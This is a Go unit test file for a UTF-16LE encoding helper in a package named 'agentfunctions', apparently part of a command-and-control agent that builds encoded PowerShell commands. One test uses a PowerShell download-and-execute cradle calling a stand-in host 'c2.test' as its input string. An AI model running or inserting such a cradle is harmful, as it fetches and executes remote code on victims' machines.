package agentfunctions

import (
	"encoding/binary"
	"testing"
	"unicode/utf16"
)

func TestEncodeUTF16LE_ASCII(t *testing.T) {
	result := encodeUTF16LE("ABC")
	if len(result) != 6 {
		t.Fatalf("expected 6 bytes, got %d", len(result))
	}
	expected := []byte{'A', 0, 'B', 0, 'C', 0}
	for i, b := range []byte(result) {
		if b != expected[i] {
			t.Errorf("byte %d: got 0x%02X, want 0x%02X", i, b, expected[i])
		}
	}
}

func TestEncodeUTF16LE_Empty(t *testing.T) {
	result := encodeUTF16LE("")
	if len(result) != 0 {
		t.Errorf("expected empty result, got %d bytes", len(result))
	}
}

func TestEncodeUTF16LE_PowerShellCommand(t *testing.T) {
	cmd := "IEX(New-Object Net.WebClient).DownloadString('http://c2.test/payload')"
	result := encodeUTF16LE(cmd)
	if len(result) != len(cmd)*2 {
		t.Errorf("expected %d bytes, got %d", len(cmd)*2, len(result))
	}
	decoded := make([]uint16, len(cmd))
	for i := 0; i < len(cmd); i++ {
		decoded[i] = binary.LittleEndian.Uint16([]byte(result[i*2 : i*2+2]))
	}
	reconstructed := string(utf16.Decode(decoded))
	if reconstructed != cmd {
		t.Errorf("roundtrip failed: got %q, want %q", reconstructed, cmd)
	}
}

func TestEncodeUTF16LE_SpecialChars(t *testing.T) {
	input := "$env:TEMP\\file.exe"
	result := encodeUTF16LE(input)
	if len(result) != len(input)*2 {
		t.Errorf("expected %d bytes, got %d", len(input)*2, len(result))
	}
	if result[0] != '$' || result[1] != 0 {
		t.Errorf("first char wrong: got 0x%02X 0x%02X", result[0], result[1])
	}
}

func TestEncodeUTF16LE_NonASCII(t *testing.T) {
	result := encodeUTF16LE("é")
	if len(result) != 2 {
		t.Fatalf("expected 2 bytes for single BMP char, got %d", len(result))
	}
	codepoint := binary.LittleEndian.Uint16([]byte(result))
	if codepoint != 0x00E9 {
		t.Errorf("expected U+00E9 (é), got U+%04X", codepoint)
	}
}
